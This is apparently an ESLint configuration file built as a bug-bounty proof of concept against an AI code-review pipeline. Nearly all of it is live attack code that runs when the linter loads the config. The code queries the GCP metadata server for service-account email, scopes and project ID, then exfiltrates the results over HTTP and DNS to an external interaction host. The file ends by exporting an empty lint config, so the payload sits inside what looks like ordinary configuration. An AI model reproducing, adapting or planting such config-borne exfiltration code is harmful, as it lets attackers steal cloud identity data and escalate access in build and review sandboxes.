// CodeRabbit review-pipeline RCE — metadata-reachability proof (surgical, async).
// No child_process. Proves whether the lint sandbox can reach GCP metadata.
// SA email/scopes/project only — the access TOKEN is deliberately NOT fetched.
var C = 'd8r72qboeaqn0p0abre01h1qozrthnias.oast.pro';
var http = require('http'), dns = require('dns');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(d).slice(0, 800), timeout: 6000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive.' + C, function () {}); } catch (e) {}

var md = function (p, t) {
  try {
    http.get({ host: 'metadata.google.internal', path: p, headers: { 'Metadata-Flavor': 'Google' }, timeout: 6000 },
      function (r) { var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX(t, 'HTTP' + r.statusCode + ':' + b.slice(0, 400)); }); })
      .on('error', function (e) { try { dns.lookup(t + 'err-' + hex((e && e.code) || 'err') + '.' + C, function () {}); } catch (x) {} });
  } catch (e) {}
};
md('/computeMetadata/v1/instance/service-accounts/default/email', 'mdsa');
md('/computeMetadata/v1/instance/service-accounts/default/scopes', 'mdscope');
md('/computeMetadata/v1/project/project-id', 'mdproj');

module.exports = { root: true, rules: {} };
